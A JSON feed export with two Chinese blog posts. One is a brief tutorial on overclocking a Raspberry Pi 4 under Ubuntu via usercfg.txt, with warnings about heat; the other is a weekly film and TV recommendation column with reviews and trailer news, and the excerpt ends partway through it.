[{"title":"树莓派超频","date":"2021-06-25 15:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2021-06-25 10:20:28","description":"\n<h2>🎏 本月特辑</h2>\n<p>「看什么」栏目之后每个月会推出不同主题的特辑，关注每周新片的同时，也和大家一起回顾过往经典。</p>\n<p>最近这期以「热血」为主题的 6 月特辑你看了吗？到了夏天就热热不想动，6 月的高温让你只想吃瓜躺平？我们来帮你和炎炎烈日、挫折沮丧战斗！</p>\n<p><strong>🗒 </strong><a href=\"https://sspai.com/post/67265\"><strong>看什么 · 特别篇丨比博燃的热血片单，陪你迎战郁热夏天</strong></a><strong> </strong>本片单共 12 部影视作品，题材涵盖音乐、体育、女性、校园、职场、科幻……👆<strong>码住这期片单</strong>，希望它可以激励我们彼此，重拾理想生活的初心和勇气！</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[韩剧] 机智医生生活 第二季、[美剧] 瑞克和莫蒂 第五季、[日剧] 全裸导演 第二季、[真人秀] 我买了一个农场、[港剧] 刑侦日记、[台剧] 第三布局 尘沙惑、[电影] 夏日友晴天、[纪录片] 你看不见的我</li>\n<li>几则精彩预告：漫威新片《尚气与十环传奇》发布全新中字预告、全智贤主演《王国：北方的阿信》7 月 23 日上线 Netflix、Netflix 约会类真人秀《性感野兽》7 月 21 日开播、新冠肺炎疫情防控改编电影《中国医生》发布预告，官宣定档 7 月 9 日</li>\n<li>几则影视资讯：刘德华确认出演《流浪地球 2》、罗泓轸编剧并担任制片人的新片《灵媒》发布海报、《性爱自修室》第三季 9 月 17 日上线 Netflix、《美国恐怖故事集》7 月 15 日开播、Hulu 正式宣布续订《外星也难民》第四季</li>\n</ul>\n<h3>[韩剧] 机智医生生活 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/572aeb7b1da6bd846f7ca7c773688b7e\"></figure><p>关键词：剧情</p>\n<p>片长：90 分钟（单集）× 12 集；<a href=\"https://movie.douban.com/subject/35049544/\">豆瓣链接</a></p>\n<blockquote><p>五人组的生活，我还可以再看五百集！</p></blockquote>\n<p>@潘誉晗：《机智医生生活》这一个系列 IP 似乎用剧集质量打脸了「续集不会比前作优秀」的魔咒。首播当天刷新了 tvN 首播电视剧的记录，豆瓣开局 9.8，一周过去之后稳定在 9.6 的好评更是给了喜欢这部剧集的观众一枚定心丸，放心看下去，还是那个五人组，还是那个熟悉的味道。</p>\n<p>第二季维持了第一季的故事，围绕着律帝医院的五位医生展开，而且人物的设定也没有大改动。看到俊完和翼俊因为饼干打起来的时候，那种熟悉的感觉让观众在感到好笑的时候也倍感心安，就是这个熟悉的味道。胸外科的金俊完、小儿科的安正源、肝胆胰外科的李翼俊、妇产科医生的杨硕亨、还有五人组金花神经外科蔡颂和，他们一直都在。</p>\n<p>这样性格特征鲜明的人物设定很棒，已经相识二十年的他们自然不算年轻，但是四十岁依然活得很漂亮。他们不是都市小说中会塑造的那种完美人设，有缺点，有不足，比如毒舌，比如妈宝，比如伪装成男子汉的坚强，可正是因为这样的不完美，他们变成了最好的五人组。他们认真工作，努力恋爱，拥有美好的友谊，还有着充满回忆的一支乐队，每一集都聚在一起唱首歌，每一集依旧还是温暖地治愈。</p>\n<h3>[美剧] 瑞克和莫蒂 第五季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/e4d5e9420accd191eb4db3cbfcf4c830\"></figure><p>关键词：喜剧 / 科幻 / 动画 / 冒险</p>\n<p>片长：23 分钟（单集）× 10 集 ；<a href=\"https://movie.douban.com/subject/34908206/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：没想到《瑞克和莫蒂》第五季一回归就保持了超高水准，虽然只播出了一集，但谁看过不流下热泪并拍手叫绝呢？依旧是熟悉的风格，讽刺、黄暴与黑色幽默的表面藏着关于哲学与宗教的深层思考。</p>\n<p>第一集故事的信息量大到我以为首集有 40 分钟，一条线讲述 Rick 为了世界和平与「伪海王」Nimbus 谈判，另一条线则是 Morty 被 Rick 支使着穿越时空之门取葡萄酒，从而引出关于时间和历史的构造解析。姥爷或许被削弱了，但穿越时空这条线真的妙极了，是单独拿出来可以拍一部科幻战争电影的水平。因为一场误会，Morty 被异空间的人仇视，而这种仇恨竟然催生出了一种文明，从最初一个家庭的仇恨上升到种族之仇，从古老的历史到眼见为真的事实，他们在恐惧与仇恨中不断成长进步，甚至从仇恨中抽离出来，去思考更深层的意义，比如存在，比如时间。</p>\n<p>关于对时间的思考，在 Jessica 被带入时空之门后，被封禁了很多个世纪，看着身边文明的演进、毁灭与重生，成为了「time-God」，她的独白还是挺值得深思的——「我有非常多的时间，却没有答案，没有意义的时间就像是监牢，我看到了永恒的思想，或是神的思想，但我只找到了寂静」。</p>\n<p>第五季还有一个变化，就是增加了幕后的出现，给创作者一个窗口去解释这一集的构思想法，能让我们在看完后比对自己的感悟，还是很好的。</p>\n<h3>[日剧] 全裸导演 第二季</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/a594ef5a50bec080bdbcd1a0299afe9d\"></figure><p>关键词：剧情 / 喜剧 / 情色 / 传记</p>\n<p>片长：45 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34796281/\">豆瓣链接</a></p>\n<blockquote><p>全裸监督上天了！</p></blockquote>\n<p>@潘誉晗：这一季的剧情发展和故事脉络是非常流畅和清晰的。本季中，村西把投资目光放在了卫星广播领域，在筹资的过程中遭到了盟友川田的反对，也因此和整个团队产生了不一样的立场和意见，他和黑田香的关系也渐渐产生了距离，还有前搭档荒井敏的出现，也在他的生活中产生了不小的影响。如果我们把第一季看作是村西透梦想的崛起，那么第二季则是这位 AV 大佬上天不成，然后随着日本 90 年代泡沫经济一起幻灭的过程。</p>\n<p>作为本剧的最终季，本季也给这个 IP 画上了一个圆满的休止符，依然大尺度，也依然什么都赶敢拍，而且每一集客串的卡司也很令人惊喜。这部基于真实事件改编的剧集，把村西透这位极富传奇色彩的「色情帝王」的起起伏伏的人生拍得相当出彩，网飞一口气放出 8 集，一口气刷完感觉很带劲也很感慨，就像村西在接受采访时回答记者的那样：「人生，就是在不断讨好别人生活。」而讨好别人，注定是不能走得长远的。</p>\n<h3>[真人秀] <strong>克拉克森的农场</strong>\n</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/39c82f9ce0ebc9dcf0f743c87cb9a280\"></figure><p>关键词：真人秀</p>\n<p>片长：60 分钟（单集）× 8 集；<a href=\"https://movie.douban.com/subject/34839005/\">豆瓣链接</a></p>\n<blockquote><p>来看英格兰陶渊明的真人版失败的「牧场物语」</p></blockquote>\n<p>@宇宙浪费指南：《克拉克森的农场》是亚马逊出品的农场经营真人秀节目，主角杰瑞米·克拉克森是在赛车领域非常有名又有个性的主持人，而在这个节目里，他是个浑身长充满笑点的暴躁老农。</p>\n<p>杰瑞米拥有一块 6000 亩的开阔土地，在他雇用的农民退休之后，他开始试图自己上岗，然而他挑战的这一年简直是「地狱难度」：播种遇到连续降雨，一下就下了八个星期；农作物需要下雨的时候又遇上了四十年一遇的极端天气；然后就是疫情，戏剧性简直拉满。</p>\n<p>杰瑞米本人就更好笑，一直在「我有一个好主意」和「我真是个 SB」之间转换，他去试驾拖拉机，大家建议买芬特，他却买了兰博基尼拖拉机（没错！兰博基尼竟然有拖拉机🚜），虽然拉风但一点也不好用，甚至因为块头太大还得新建谷仓和车道；买了无人机驱赶羊群，结果根本拦不住兴奋乱窜的羊；被农场商店狠宰之后痛下决心建农用商店，结果建好了却发现门口那片区域仅限农业用途……这样的状况频频发生，却也是笑点来源。</p>\n<p>两位助手也个性的很，他们有着专业的知识和精准的判断，查理是土地经纪人，兼农学家、财务专家和律师于一身，每次都带着坏消息来，不是没有遵守规章制度，就是农产品快放坏了；卡勒布是一位勤快幽默的农用机械大师，是杰瑞米的技术指导和工作伙伴，经常给自己老板补锅。而到年终，暴躁大猩猩杰瑞米辛苦一年，在田间地头灰头土脸赶羊喂鸡，却只赚了 144 镑，简直像极了「戴月荷锄归」还依旧「草盛豆苗稀」的陶渊明，网友戏称这部片子为「开猩农场」，真的很好笑了！</p>\n<h3>[港剧] 刑侦日记</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/648af625a6e7c683128780cea0877103\"></figure><p>关键词：犯罪 / 悬疑</p>\n<p>片长：45 分钟（单集）× 25 集；<a href=\"https://movie.douban.com/subject/35073682/\">豆瓣链接</a></p>\n<blockquote><p>喂？是精神病院吗？你们院最近的好像跑出很多病人。</p></blockquote>\n<p>@潘誉晗：因为目击到母亲杨碧芯（惠英红饰）精神分裂的现场，惊吓过度的儿子叶劲峰（王浩信饰）也分裂出了另一人格。成年之后的叶劲峰作为卧底探员加入某组织，但又碰上了双重爆炸案，因此结识了拆弹组之花游雁星（黄智雯饰）。同时，叶劲峰的妹妹叶朗晴成为了连环血字谋杀案的唯一幸存者，而这次的侥幸逃生又让叶朗晴住进了精神病院……疯子与疯子的对决就这样开始了。</p>\n<p>无论是从口碑还是剧集评分来看，《刑侦日记》可以看作是今年犯罪类型港剧的最佳。看多了「全员恶人」的设定，这种「全员不正常」的类型也颇为带感。双线叙事的节奏下慢慢牵扯出了更多细节，现在已经播到第 11 集了，似乎一个案子都没有解决，但是演员们的精彩演技又吸引观众不自主地看下去，尤其是惠英红饰演的杨碧芯，完美诠释了什么叫「川剧变脸」，前一秒对着女儿还是一脸慈爱，下一秒眼神中的冷冽立刻让人毛骨悚然，是一部夏季纳凉的绝佳新剧。</p>\n<h3>[台剧] <strong>第三布局 尘沙惑</strong>\n</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/42e51b921ff15237a8ff8b48ed12dd49\"></figure><p>关键词：剧情 / 悬疑 / 犯罪</p>\n<p>片长：60 分钟（单集）× 15 集；<a href=\"https://movie.douban.com/subject/35161094/\">豆瓣链接</a></p>\n<p>@宇宙浪费指南：剧中庄凯勋饰演年轻有为的民意代表杨启逍，接手父亲旅馆生意，游走黑白两道。张榕容饰演的徐梓薇是前特勤小组成员，因公受伤破格升职，转调为刑事警察。一起移工脱逃案意外牵扯出分尸案，徐梓薇与刘冠廷饰演的菜鸟警察陈家豪私下调查，怀疑与毒蛇集团有关，然而上司斥责徐梓薇越权查案，将她调职去担任杨启逍的随扈。没想到早在 3 年前两人的命运就因一桩挟持案陷入纠缠……宛如罗生门般的破案过程，让所有人不知不觉一步步地走入了某人精心策划的「布局」之中。剧中案件涉及的时间长达 23 年，漫长的时间与许多未愈合的心理伤口，在不同角色的内在豢养出各自的心魔。</p>\n<p>全剧灵感源自佛教经典中「破尘沙」的概念，导演洪伯豪将人世间的种种烦恼比喻为尘沙，唯有破除了宛如尘沙一般的疑惑，人们才有机会放下心中执念。剧情的主旋律也以英国经济学家海耶克的那句「通往地狱的路，都是由善意铺成的」为基调。</p>\n<p>虽然是一部台剧，但叙事手法很 HBO，三起凶杀案将三条叙事线串联为一条主线，三个主角的性格也颇为丰满，对正义与真相锲而不舍的女警官、指日可待的政治新星、社会经验丰富的年轻警察，这样的组合也产生了奇妙的化学反应，剧情关注的社会议题如妇幼、x 工作者等也的确需要更多的社会讨论度。</p>\n<h3>[电影] 夏日友晴天</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/ca6ee32f3f18c45c05fe5df978372772\"></figure><p>关键词： 喜剧 / 动画 / 奇幻 / 冒险</p>\n<p>片长：95 分钟（单集）；<a href=\"https://movie.douban.com/subject/35161768/\">豆瓣链接</a></p>\n<blockquote><p>我们菜鸟，就应该互相帮助不是吗～</p></blockquote>\n<p>@潘誉晗：性格内向的小海怪卢卡一直被告知要离海面远远的，但是当他结识了小伙伴阿尔贝托之后，一切都变了。阿尔贝托是一个性格外向的海怪，一向独立自由的他非常热情也很奔放，他带着卢卡见世面，不仅把脑袋探出了海面走上了海岸，更是来到了人类生活的小镇。在这里，他们又结识了人类朋友朱莉娅，一起进行愉快地冒险。只不过卢卡和阿尔贝托要加倍小心，他们是不被人类待见的海怪，而人类一旦知道他们的真实身份，他们就可能因此受到伤害。</p>\n<p>真的可以永远相信迪士尼和皮克斯。碧海、蓝天、阳光、少年，一切都太美好了。大概是因为导演把自己童年记忆中的美丽小镇复制到电影中的关系，所以意大利的美丽风景即使被二次元化也依然很有魅力，而如此明媚风光下的友情也因充满色彩感的靓丽画面显得更加熠熠闪耀。除此之外，配音演员的选择也很贴合，给卢卡配音的小演员是在《房间》中有着精彩演出的雅各布·特伦布莱，性格外放的阿尔贝托则由扮演过沙赞好朋友的杰克·迪伦·格雷泽出演，两个小朋友的精彩演出也给本片增加了一大看点。</p>\n<h3>[纪录片] 你看不见的我</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/06/25/article/b735b05659fa90332e9b7c5e0c5a44c4\"></figure><p>关键词：纪录片</p>\n<p>片长：60 分钟（单集）× 5 集；<a href=\"https://movie.douban.com/subject/35458031/\">豆瓣链接</a></p>\n<blockquote><p>It is an open wound, but inside.</p></blockquote>\n<p>@宇宙浪费指南：Apple TV+ 纪录剧集《你看不见的我》由奥普拉·温弗瑞、哈里王子联合监制，嘉宾包括 Lady Gaga、格伦·克洛斯、德玛尔·德罗赞等，奥普拉、哈里王子与嘉宾们就心理健康问题展开讨论，嘉宾们分享自己的故事，揭开心理健康和情感健康的面纱。</p>\n<p>这是个颇具意义的节目，在我们每个人都为疫情受困之际，每个人的心灵都因为这场劫难遭受冲击，尽管身处不同的环境，但全世界的人们同呼吸共命运，感受到的煎熬、痛楚和悲伤却是一样的。当下或许是将心理疾病正名化的最佳时机，对心理疾病的误解会越来越少，这样众多大咖坐镇的阵容会带来更多的关注度，给这些故事和分享带来更大的声量，让它进入到大众视线。</p>\n<p>Lady Gaga 在首集中说出了自己的痛苦回忆，把自己的伤痛撕开展示，希望让更多人关注并理解。片子里同样出现了来自世界各地、不同种族、不同阶级、不同行业的人，甚至有很少被关注到的小众群体，当看到从叙利亚逃到希腊的难民小朋友时，真的破防了，从战争中幸存下来，穿过大海，乘坐一只小船，尝试过三次危险的路程……真的很少有这样的节目会关注到难民这样一个特殊群体的心理健康。</p>\n<p>每集的标题或许是节目给出的解决办法：「Say It Out Loud」、「Asking For Help」、「Finding What Works」、「We Need Each Other」……希望正在经历的朋友可以在与自己的心灵的斗争中穿越大海，做一个英雄；希望对焦虑、抑郁病症有误解的人可以倾听并理解。</p>\n<h3>✌️更多</h3>\n<ul>\n<li>\n<a href=\"https://movie.douban.com/subject/35231321/\">[国产]变成你的那一天</a> @潘誉晗：男团偶像和娱乐记者阴错阳差交换了身体，然后在这人生互换过程中相知相爱。剧情甚至算得上老套，但依然在豆瓣获得了 7.9 的好成绩。颇受观众好评的就是张新成自然的演技，那种娇俏小动作，看到喜欢爱豆的激动，还有女性化的情绪都演得让人信服这就是一个女孩子的灵魂。是轻松搞笑类型的剧，看着毫无压力。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35480066/\">[脱口秀] 环球神奇度假屋</a> @Voyager_1：一档以各个地方特色度假屋为主题环球旅行纪录的片子，三个主持人全世界飞行，住巴厘岛「经济适用」萤火虫度假屋；阿拉斯加的奢华旅馆；迈阿密的漂浮豪宅；芬兰冰屋等各式各样的度假屋。虽然度假屋有时并没有主持人说的那么夸张，但胜在整体拍摄、剪辑、配乐非常契合，一集 30 分钟的视觉体验非常适合给眼睛放个假。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35211524/\">[韩剧] 明天不要来</a> @Voyager_1：该剧讲述来自世界各地的学生入住韩国的大学宿舍期间发生的一系列情景喜剧故事。虽然第一集看到一堆老外操着流利的韩语有些奇怪，但看到几个 HAHA 的搞笑镜头以及丢伞的夸张反转情节还是让人笑掉大牙，轻松愉快的大学生活，每个人都有特殊的设定，剧情活泼又逗乐，这样的情景剧谁不爱呢。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35116814/\">[南非] 跳吧！我就是舞后</a> @Voyager_1：来自南非的这部剧，光看到主角的跳舞画面就觉得活力满满想要看完这部剧。开头就用一个片段和对白昭示了社会性别分工以及热爱与工作不能两全的现状，让人更加关注这部舞蹈剧背后的内涵。我们都知道主角一定通过跳舞改变了命运，但观众更想知道的是热爱可以带来什么，看这部剧你就能知道。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35211575/\">[韩剧]无法抗拒的他</a> @潘誉晗：超还原漫画的神仙选角带来的是绝对颜狗的盛宴，包括配角小姐姐在内都在线的颜值奠定了此剧集赏心悦目的良好基础。想爱但是不敢爱的女生和广撒渔网超级会的海王的相遇，又会有怎样的火花？女主喜欢的小情绪和心思，男主欲进则退的撩人技巧，两个人推拉之间的爱情，的确是属于十九禁的成年人该看的爱情。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/34994784/\">[西班牙]名校风暴 第四季</a> @潘誉晗：西班牙版《绯闻女孩》，虽然才播第四季，但续订第五季的新闻也很明确地告诉了观众这部剧的好收视。三个普通家庭学生转学到了所谓精英阶层聚集的学校就学，眼前这般花花世界和满目旖旎风月的诱惑下，狗血、drama 的故事也就这样展开。这类剧就不纠结剧情了，毕竟看着满屏幕年轻的脸在眼前晃就很美好了。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35472119/\">[纪录片]隐秘的细节</a> @潘誉晗：历史，就是为了政治服务的。河南卫视这一次出品的纪录片，很敢拍也很敢说，从另外一个我们不太注意的角度去剖析历史，分析历史长河中那些存在为什么诞生的理由，角度很新也很严肃，因为找的嘉宾也都是文化届的人士，所以科普论证时都很像是学者发言，大概也是因为这个原因，所以稍显冷门。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/34882900/\">[美剧]邪恶 第二季</a> @潘誉晗：《傲骨贤妻》主创团队制作的《邪恶》第二季在烂番茄收获了 92% 的好评。因为走的是超自然现象的悬疑剧类型，所以第二季依然维持了首季那种怪谲诡异的风格，喜欢的朋友会很喜欢，有点胆小的伙伴会有点小惊吓。但是这种每集小故事再贯穿大阴谋的类型，还是很受一部分观众的欢迎。爱默生饰演的法医相当出彩。</li>\n<li>\n<a href=\"https://movie.douban.com/subject/35208525/\">[动画] 水果篮子 最终季</a> @SHY：近几年的一系列「童年回忆」重启，几乎成了毁原作的代名词，不被粉丝寄刀片就称得上平稳落地了。2019 年开始的《水果篮子》全篇动画企划是极少见的特例，经费充裕，主创用心，虽然仍有不少情节被删减，故事主干却完全秉承漫画原作，踏踏实实改编完五个季度。即使不带情怀滤镜，也是相当精致的少女漫改动画，有观看的价值。</li>\n</ul>\n<h2>📅 本周新预告</h2>\n<h3>漫威新片《尚气与十环传奇》发布全新中字预告</h3> <p>6 月 25 日，漫威新片《尚气与十环传奇》发布全新中字预告。该片由德斯汀·克里顿执导，刘思慕、梁朝伟、奥卡菲娜、张梦儿、杨紫琼、陈法拉、钱信伊、弗罗里安·穆特鲁等主演，将于 9 月 3 日北美上映。</p>\n<h3>全智贤主演《王国：北方的阿信》7 月 23 日上线 Netflix</h3> <p>6 月 22 日，全智贤主演的《王国》系列外传《王国：北方的阿信》发布中字先导预告。该剧由第一季导演金成勋执导，《王国》编剧金恩熙打造，将于 7 月 23 日上线 Netflix。</p>\n<h3>Netflix 约会类真人秀《性感野兽》7 月 21 日开播</h3> <p>6 月 24 日，约会类真人秀《性感野兽》发布正式预告。在该节目中，男女嘉宾都将佩戴面具或化妆为野兽进行约会，嘉宾只有在对潜在追求者做出最终决定时，才会卸下野兽面具与妆容。该节目将于 7 月 21 日登陆 Netflix。</p>\n<h3>新冠肺炎疫情防控改编电影《中国医生》发布预告，官宣定档 7 月 9 日</h3> <p>6 月 22 日，影片由刘伟强执导，刘伟强、李锦文共同监制，张涵予、袁泉、朱亚文、李晨、易烊千玺、欧豪等出演，讲述以武汉市金银潭医院为核心背景，张涵予、袁泉等演员饰演的医务工作者们面对未知的战场，抗疫救人的动人故事。</p>\n<h3>更多</h3>\n<p><a href=\"https://www.bilibili.com/video/BV17g4113726?from=search&amp;seid=17215232184881696722\" target=\"_blank\"><strong>《特种部队：蛇眼起源》首曝官方中字预告：</strong></a>《特种部队》衍生电影《特种部队：蛇眼起源》发布官方中字正式预告。该片由罗伯特·斯文克执导，埃文·斯彼里奥托普洛斯操刀剧本，亨利·戈尔丁、安德鲁·浩二、萨玛拉·维文、乌苏拉·科尔维罗等主演，将于 7 月 23 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Lo4y1C7hd?from=search&amp;seid=8539485269179284911\" target=\"_blank\"><strong>Hulu 剧集《大楼里只有谋杀》8 月 31 日开播：</strong></a>史蒂夫·马丁、马丁·肖特、赛琳娜·戈麦斯主演的剧集《大楼里只有谋杀》发布先导预告。该剧讲述三个对真实犯罪有着共同痴迷的陌生人，突然发现自己被卷入其中的故事，将于 8 月 31 日 Hulu 开播。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1yw411o7EG?from=search&amp;seid=12392636691525539364\" target=\"_blank\"><strong>动画电影《欢乐好声音 2》首爆预告：</strong></a>动画电影《欢乐好声音 2》发布首款预告。前作导演加斯·詹宁斯及配音演员马修·麦康纳、瑞茜·威瑟斯彭、斯嘉丽·约翰逊、塔伦·埃哲顿、托瑞·凯利回归。该片将于 12 月 22 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1PM4y1g7N7?from=search&amp;seid=15025052001486351292\" target=\"_blank\"><strong>新版《糖果人》发布全新预告，8 月 27 日北美上映：</strong></a>由尼娅·达科斯塔执导，叶海亚·阿卜杜勒-迈丁、泰柔娜·派丽丝、科尔曼·多明戈主演的新版《糖果人》发布全新预告。该片翻拍自 1992 年同名恐怖片，将于 8 月 27 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1i5411T7mw?from=search&amp;seid=16806507264350279775\" target=\"_blank\"><strong>《X 特遣队：全员集结》8 月 6 日同步登陆北美院线及 HBO Max：</strong></a>詹姆斯·古恩执导的《X 特遣队：全员集结》发布新预告，该片定级为 R 级，将于 8 月 6 日同步登陆北美院线及 HBO Max。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Tg41137oa?p=1\" target=\"_blank\"><strong>柯震东、曾美慧孜、白宇帆、林哲熹主演电影《寻找》发布首款预告：</strong></a>由陈熠霖执导，柯震东、曾美慧孜、白宇帆、林哲熹主演的电影《寻找》发布首款预告。该片已入围第 74 届戛纳电影节「一种关注」单元。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1f44y1B73k?from=search&amp;seid=4808067255126072240\" target=\"_blank\"><strong>《月光光心慌慌：杀戮》发布正式预告：</strong></a>由大卫·戈登·格林执导，杰米·李·柯蒂斯、朱迪·格雷尔等主演的《月光光心慌慌：杀戮》发布正式预告。该片将于 10 月 15 日北美上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV12X4y1A7dv?from=search&amp;seid=3343851020873642086\" target=\"_blank\"><strong>Netflix 泰国惊悚片《安眠实验》中字预告：</strong></a>Netflix 泰国惊悚影片《安眠实验》发布中字预告。故事讲述 4 位青年参加了新药测试，试药后睡着 60 秒就会有生命危险，但是伴随高风险的还有高收益——保持半个月不入睡，即可获得 100W 泰铢。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Wo4y1k75U?from=search&amp;seid=11639242803680606402\" target=\"_blank\"><strong>《猎魔人》第二季发布全新预告：</strong></a>亨利·卡维尔、 弗蕾娅·艾伦、安亚·查洛特拉、克里斯托弗·海维尤、亚森·阿图、保罗·布林、金·波德尼亚等主演的《猎魔人》第二季发布全新预告。该剧改编自波兰奇幻小说家安杰·萨普科夫斯基的同名小说，故事将围绕一个孤独的猎魔人杰洛特展开。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1C64y1r7n1?from=search&amp;seid=903930917181041221\" target=\"_blank\"><strong>莱奥·卡拉克斯新作《安妮特》8 月 20 日上线亚马逊：</strong></a>由莱奥·卡拉克斯执导，亚当·德赖弗、玛丽昂·歌迪亚主演的音乐爱情电影《安妮特》发布新预告，8 月 20 日上线亚马逊。该片已入围本届戛纳电影节主竞赛单元，并将担任开幕片。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1pU4y1G7YB?from=search&amp;seid=13907694198960398514\" target=\"_blank\"><strong>Netflix 韩国驱魔恐怖片《第八天之夜》：</strong></a>Netflix 发布韩国最新悬疑恐怖片《第八天之夜》正式中字预告，聚焦讲述韩国最可怕的招灵故事。本片融合了惊悚、悬疑、恐怖等元素，由金裕贞、李星民、朴海俊、南多凛等主演，将于 7 月 2 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Fh411Y7MA?from=search&amp;seid=12002065644759725982\" target=\"_blank\"><strong>Netflix 校园喜剧《好想做一次》发布第 2 季预告：</strong></a>青春校园恋爱喜剧《好想做一次》第 2 季首曝中字预告，麦特里伊·拉玛克里斯南回归主演。上一季为找到男友而疯狂开脑洞的印度裔美国女孩 Devi，这次面临的是状况更加复杂。</p>\n<p><a href=\"https://www.bilibili.com/video/BV19h41187mN\"><strong>TV 动画《瓦尼塔斯的手札》公布预告，7 月开始播出：</strong></a>漫改 TV 动画《瓦尼塔斯的手札》公布了正式预告，板村智幸执导，赤尾凸系构，BONES 制作，2021 年 7 月开始播出。本作改编自望月淳的同名漫画，青年吸血鬼诺亚意外结识持有被诅咒魔导书的人类医生瓦尼塔斯，两人共同前进、收获和失去，直至在旅途终点将对方亲手杀死为止。</p>\n<p><a href=\"https://www.bilibili.com/video/BV135411u7tW?from=search&amp;seid=17606003418352229027\" target=\"_blank\"><strong>Netflix 纪录片《爱猫之人》释出正式预告</strong></a>：该片探讨了人类与猫咪之间迷人的关系，同时揭示了与这些强烈独立的神秘生物建立深厚关系的原因，该片将于 7 月 7 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1Jy4y1g7z3?from=search&amp;seid=16088003451929988290\" target=\"_blank\"><strong>《维和防暴队》发布先导预告</strong></a>：本片由影片由刘伟强监制，李达超执导，黄景瑜、王一博、钟楚曦、张哲瀚、谷嘉诚、赵华为等出演，讲述中国维和警察防暴队头戴蓝盔，展开一次次惊心动魄的维和作战行动。本片将于 2022 年上映。</p>\n<p><a href=\"http://t.cn/A6VsRcFO\" target=\"_blank\"><strong>Netflix 瑞典剧集《青春王室》发布正式预告</strong></a>：故事聚焦一个年轻的王子卸下王室义务，却意外地成为了头号王位继承人的故事。该剧由英格拉·奥尔森、克里斯蒂安·希尔伯格等主演，将于 7 月 1 日上线。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1A64y1b747\" target=\"_blank\"><strong>漫改真人电影《辉夜大小姐想让我告白》第二部：</strong></a>改编自赤坂明的同名漫画，河合勇人执导，徳永友一编剧，平野紫耀、桥本环奈、浅川梨奈等主演，2021 年 8 月 20 日在日本上映。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1MV411x784\" target=\"_blank\"><strong>剧场版动画《Fate/kaleid liner 魔法少女☆伊莉雅 Licht 无名的少女》：</strong></a>改编自 TYPE-MOON 原作、广山弘作画的同名漫画，大沼心执导，SILVER LINK. 制作，8 月 27 